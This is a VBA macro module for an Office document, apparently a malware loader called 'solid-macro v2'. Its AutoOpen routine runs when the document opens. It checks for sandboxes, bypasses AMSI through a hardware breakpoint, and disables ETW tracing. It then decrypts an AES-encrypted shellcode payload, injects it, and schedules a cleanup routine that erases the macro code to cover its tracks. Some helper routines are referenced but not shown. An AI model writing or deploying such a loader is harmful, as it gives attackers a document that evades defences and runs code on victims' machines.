Option Explicit

Public Sub AutoOpen()
    On Error GoTo Bail
    DbgPrint "[+] solid-macro v2 AutoOpen"
    If Not ValidateEnvironment() Then
        DbgPrint "[-] ValidateEnvironment returned False; bailing"
        Exit Sub
    End If
    RunExploit
    Exit Sub
Bail:
    DbgPrint "[-] AutoOpen exception: " & Err.Number & " " & Err.Description
End Sub

Private Sub RunExploit()
    DbgPrint "[+] Phase 3: ResolveSyscalls"
    If Not ResolveSyscalls() Then
        DbgPrint "[-] ResolveSyscalls failed; aborting"
        Exit Sub
    End If

    DbgPrint "[+] Phase 4a: InstallAmsiHWBP"
    If Not InstallAmsiHWBP() Then
        DbgPrint "[!] InstallAmsiHWBP failed; continuing without"
    End If

    DbgPrint "[+] Phase 4b: KillEtwForThisThread"
    If Not KillEtwForThisThread() Then
        DbgPrint "[!] KillEtwForThisThread failed; continuing"
    End If

    DbgPrint "[+] Phase 5: Decrypt payload"
    Dim shellcode() As Byte
    shellcode = AesCtrDecrypt(GetEncryptedShellcode(), GetPayloadKey(), GetPayloadNonce())
    If UBound(shellcode) - LBound(shellcode) + 1 < 1 Then
        DbgPrint "[-] Decryption produced empty payload"
        Exit Sub
    End If

    DbgPrint "[+] Phase 6: Inject"
    If Not Inject(shellcode) Then
        DbgPrint "[-] Inject failed"
        Exit Sub
    End If

    DbgPrint "[+] Phase 7: Schedule Cleanup for Now+2s"
    Application.OnTime Now + TimeSerial(0, 0, 2), "Cleanup"
End Sub

Private Function ValidateEnvironment() As Boolean
    On Error Resume Next
    ' Uptime > 10 minutes (sandbox VMs typically have low uptime)
    If GetTickCount64Wrapper() < 600000 Then Exit Function
    ' Domain must not be WORKGROUP (a minimal "domain-joined" check)
    Dim domain As String
    domain = Environ("USERDOMAIN")
    If Len(domain) = 0 Then Exit Function
    If StrComp(domain, "WORKGROUP", vbTextCompare) = 0 Then Exit Function
    ' Note: for a real lab, replace the WORKGROUP check with an HMAC of a keyed
    ' target domain SID. The current check is intentionally permissive for the
    ' polished-sketch artifact.
    ValidateEnvironment = True
End Function

Private Function GetTickCount64Wrapper() As LongLong
    Dim hKernel As LongPtr, pGetTick As LongPtr
    hKernel = GetMod(MkStr(107, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108))
    pGetTick = GetProc(hKernel, MkStr(71, 101, 116, 84, 105, 99, 107, 67, 111, 117, 110, 116, 54, 52))
    If pGetTick = 0 Then Exit Function
    GetTickCount64Wrapper = CLngLng(Call0(pGetTick))
End Function

' Cleanup: best-effort remove VBA components after the AutoOpen call stack unwinds.
' Requires "Trust access to the VBA project object model" enabled in Trust Center.
' Silently no-ops otherwise.
Public Sub Cleanup()
    On Error Resume Next
    Dim vbProj As Object
    Set vbProj = ThisDocument.VBProject
    Dim i As Long, comp As Object
    For i = vbProj.VBComponents.Count To 1 Step -1
        Set comp = vbProj.VBComponents(i)
        If comp.Type = 100 Then
            ' ThisDocument: clear its code module rather than remove the component
            comp.CodeModule.DeleteLines 1, comp.CodeModule.CountOfLines
            comp.CodeModule.AddFromString "' (cleaned)"
        Else
            vbProj.VBComponents.Remove comp
        End If
    Next i
    ThisDocument.Saved = True
End Sub
